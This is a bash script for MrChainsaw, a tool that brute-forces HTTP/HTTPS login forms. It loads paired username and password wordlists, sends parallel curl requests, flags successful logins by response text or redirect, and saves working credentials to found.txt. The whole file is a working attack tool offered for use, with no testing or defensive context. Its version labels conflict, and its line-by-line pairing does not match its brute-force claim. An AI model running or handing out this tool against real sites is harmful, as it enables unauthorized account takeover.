#!/bin/bash

# ===================== HELP =====================
if [[ "$1" == "--help" || $# -lt 5 ]]; then
  echo "MrChainsaw v1.4 - Intelligent brute force for HTTP/HTTPS login"
  echo
  echo "<< Part of the DYSØRDER project >> | By simplyYan"
  echo
  echo "Usage: $0 --url URL --fields field1,field2,... --wordlists list1.txt,list2.txt --success \"SuccessText\""
  echo "       [--method POST|GET] [--headers \"header1:value\"] [--cookies \"cookie1=value\"]"
  echo "       [--delay 0.5] [--threads 10] [--check-redirect] [--show-location]"
  echo
  echo "Example:"
  echo "$0 --url https://example.com/login --fields username,password --wordlists users.txt,pass.txt --success \"Welcome\" --method POST --delay 0.5 --threads 5 --check-redirect --show-location"
  exit 1
fi

# ===================== INITIAL VARIABLES =====================
URL=""
FIELD_NAMES=()
WORDLISTS=()
SUCCESS_PATTERN=""
METHOD="POST"
DELAY=0
THREADS=1
HEADERS=""
COOKIES=""
CHECK_REDIRECT=false
SHOW_LOCATION=false

# ===================== PARSING PARAMETERS =====================
while [[ $# -gt 0 ]]; do
  case "$1" in
    --url) URL="$2"; shift 2 ;;
    --fields) IFS=',' read -r -a FIELD_NAMES <<< "$2"; shift 2 ;;
    --wordlists) IFS=',' read -r -a WORDLISTS <<< "$2"; shift 2 ;;
    --success) SUCCESS_PATTERN="$2"; shift 2 ;;
    --method) METHOD="$2"; shift 2 ;;
    --delay) DELAY="$2"; shift 2 ;;
    --threads) THREADS="$2"; shift 2 ;;
    --headers) HEADERS="$2"; shift 2 ;;
    --cookies) COOKIES="$2"; shift 2 ;;
    --check-redirect) CHECK_REDIRECT=true; shift ;;
    --show-location) SHOW_LOCATION=true; shift ;;
    *) echo "Invalid argument: $1"; exit 1 ;;
  esac
done

# ===================== VALIDATIONS =====================
if [[ -z "$URL" || -z "$SUCCESS_PATTERN" ]]; then
  echo "Error: --url and --success are required."
  exit 1
fi

if [[ ${#FIELD_NAMES[@]} -ne ${#WORDLISTS[@]} ]]; then
  echo "Error: Number of fields does not match the number of wordlists."
  exit 1
fi

for w in "${WORDLISTS[@]}"; do
  if [[ ! -f "$w" ]]; then
    echo "Error: Wordlist '$w' not found."
    exit 1
  fi
done

# ===================== LOAD COMBINATIONS =====================
mapfile -t FIELD_VALUES < <(paste -d '|' "${WORDLISTS[@]}")

# ===================== SEND REQUEST FUNCTION =====================
send_request() {
  local post_data=""
  for i in "${!FIELD_NAMES[@]}"; do
    k="${FIELD_NAMES[$i]}"
    v="${values[$i]}"
    post_data+="${k}=$(printf '%s' "$v" | jq -sRr @uri)&"
  done
  post_data="${post_data%&}"

  curl_args=(-sk -o - -D -)

  [[ -n "$HEADERS" ]] && curl_args+=($(sed 's/^/-H "/;s/$/"/' <<< "$HEADERS"))
  [[ -n "$COOKIES" ]] && curl_args+=(-H "Cookie: $COOKIES")

  if [[ "$METHOD" == "POST" ]]; then
    response=$(curl "${curl_args[@]}" -X POST -d "$post_data" "$URL")
  else
    response=$(curl "${curl_args[@]}" -G --data "$post_data" "$URL")
  fi

  echo "$response"
}

# ===================== CHECK SUCCESS FUNCTION =====================
check_success() {
  local full_response="$1"
  local headers body http_code location

  headers=$(echo "$full_response" | sed '/^\r$/q')
  body=$(echo "$full_response" | sed '1,/^\r$/d')
  http_code=$(echo "$headers" | head -n 1 | awk '{print $2}')
  location=$(echo "$headers" | grep -i '^Location:' | awk '{print $2}' | tr -d '\r')

  if echo "$body" | grep -q "$SUCCESS_PATTERN"; then
    echo "[+] Success by pattern with data: $post_data"
    echo "$post_data" >> found.txt
    return 0
  fi

  if [[ "$CHECK_REDIRECT" == true && ( "$http_code" == "301" || "$http_code" == "302" ) ]]; then
    echo "[+] Success by redirect ($http_code) with data: $post_data"
    if [[ "$SHOW_LOCATION" == true && -n "$location" ]]; then
      echo "[>] Location: $location"
    fi
    echo "$post_data" >> found.txt
    return 0
  fi

  return 1
}

# ===================== BRUTE FORCE =====================
attempt_login() {
  IFS='|' read -r -a values <<< "$1"

  post_data=""
  for i in "${!FIELD_NAMES[@]}"; do
    k="${FIELD_NAMES[$i]}"
    v="${values[$i]}"
    post_data+="${k}=$(printf '%s' "$v" | jq -sRr @uri)&"
  done
  post_data="${post_data%&}"

  echo "[*] Trying: $post_data"
  response=$(send_request "$post_data")

  if check_success "$response"; then
    kill 0 
    exit 0
  fi
}

echo "Starting MrChainsaw v1.1..."

current_thread=0
for line in "${FIELD_VALUES[@]}"; do
  attempt_login "$line" &
  ((current_thread++))

  if ((current_thread >= THREADS)); then
    wait
    current_thread=0
  fi

  sleep "$DELAY"
done

wait
echo "[-] No successful combinations found."
exit 1
